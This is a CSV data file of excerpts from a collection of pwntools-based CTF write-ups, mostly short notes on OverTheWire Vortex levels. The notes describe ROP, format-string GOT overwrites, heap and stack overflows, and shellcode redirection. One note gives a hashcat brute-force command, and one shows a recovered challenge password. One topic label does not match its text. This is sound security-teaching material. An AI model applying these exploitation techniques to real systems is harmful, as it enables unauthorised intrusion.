dataset,identifier,repo,relative_path,title,topic,excerpt
ctf_writeup,pwntools-write-ups-0,pwntools-write-ups,README.md,pwntools-write-ups,rop,"# pwntools-write-ups A collection of CTF write-ups all using pwntools ## Dependencies - libc++1 (2014/gits-teaser/citadel) - pwntools (master branch from github, and ofc. all dependencies for pwntools) ## Known Issues Some of the tests are a bit finnicky, both due to pwntools and the services themselves. - Some services cannot be re-run immediately (services without REUSEADDR) - Services that aren't working: - 2013/pctf/ropasaurus - 2014/defcon-quals/babyfirst-heap - 2014/defcon-quals/bbgp If other tests are failing or there are other issues (e.g. services still running after the test), then please file an issue."
ctf_writeup,pwntools-write-ups-1,pwntools-write-ups,wargames/overthewire-vortex/level12/README.md,level12,buffer_overflow,"# Vortex 12 This is the same challenge as Level 8, but with NX enabled. We leverage pwntools' `gdb.find_module_addresses(binary, ssh=shell)` to grab all of the addresses for the libraries, then use pwntools' `ROP` module to generate a ROP stack to load some shellcode. The shellcode then does the exact same thing as level 8. The interesting part for this challenge was where to put the ROP. The buffer overflow is `strcpy` and I didn't want to restrict the ROP in any way. It turns out that you can store arbitrary data in the `argv[]` array, so I put it there. I use GDB to do stack-hunting to find the absolute address of my `argv[]` to do the pivot. Again, I use hellman's `r.sh` so that stack addresses in GDB and not-GDB are connsitent."
ctf_writeup,pwntools-write-ups-2,pwntools-write-ups,wargames/overthewire-vortex/level4/README.md,level4,format_string,"# Vortex 4 `printf` format string vulnerability, combined with a bit of information about stack layout. `argc` can be zero if expressly created that way via an `exec` call. If `argv` is used to index the non-existed arguments, it can (in this case, does) index into the `envp` array. For the sake of ""because"", this also auto-discovers the offset of the arguments needed to pass to hellman's `libformatstr`. We use the format string to overwrite the GOT entry for `_exit`, and point it at our shellcode on the stack. The absolute address of the stack is leaked by a small helper program run on the target system."
ctf_writeup,pwntools-write-ups-3,pwntools-write-ups,wargames/overthewire-vortex/level3/README.md,level3,buffer_overflow,# Vortex 3 Simple buffer overflow that will write a pointer to our buffer anywhere in the binary. We use this to overwrite the GOT entry for `_exit`.
ctf_writeup,pwntools-write-ups-4,pwntools-write-ups,wargames/overthewire-vortex/level13/README.md,level13,format_string,"# Vortex 13 Format string fun for a multiple GOT overwrite. It also nulls out the args and environment. For whatever reason, libc puts a copy of `basename(argv[0])` on the stack, so we store our pointers there."
ctf_writeup,pwntools-write-ups-5,pwntools-write-ups,wargames/overthewire-vortex/level2/README.md,level2,other,# Vortex 2 Simple permissions issue with annoying filenames. Setuid binary will tar up any file you give it into `'/tmp/ownership.$$.tar'`.
ctf_writeup,pwntools-write-ups-6,pwntools-write-ups,wargames/overthewire-vortex/level5/README.md,level5,other,# Vortex5 Hash cracking exercise. Probably the fastest way to do this is with oclHashcat. ``` cudaHashcat64.exe -a3 155fb95d04287b757c996d77b5ea51f7 ?a?a?a?a?a ```
ctf_writeup,pwntools-write-ups-7,pwntools-write-ups,wargames/overthewire-vortex/level9/README.md,level9,other,"# Vortex 9 So you're supposed to just search around a bit. There aren't any interesting setuid binaries. Most of the files don't stand out. However, ones stands alone and doesn't have 20 others like it. ``` $ find . 2>/dev/null | grep vort ... ./var/mail/vortex9 ... $ cat ./var/mail/vortex9 5WT0}swdc ``` Tada."
ctf_writeup,pwntools-write-ups-8,pwntools-write-ups,wargames/overthewire-vortex/level7/README.md,level7,buffer_overflow,"# Vortex 7 If you can satisfy a CRC requirement, you get stack buffer overflow. Stack is executable, so we just replace the return address with a pointer to our buffer. Uses hellman's excellent `r.sh` to make the stack layout consistent between normal execution, `gdb`, `strace`, etc. ``` int main(int argc, char **argv) { char buf[58]; u_int32_t hi; if((hi = crc32(0, argv[1], strlen(argv[1]))) == 0xe1ca95ee) { strcpy(buf, argv[1]); } else { printf(""0x%08x\n"", hi); } } ```"
ctf_writeup,pwntools-write-ups-9,pwntools-write-ups,wargames/overthewire-vortex/level11/README.md,level11,command_injection,"# Vortex 11 Simple heap corruption vulnerability. If you spam data at it, you'll see that you get a write-what-where. We nuke the GOT entry for `_exit` with a pointer to our shellcode in the heap buffer, which is at a predictable address."
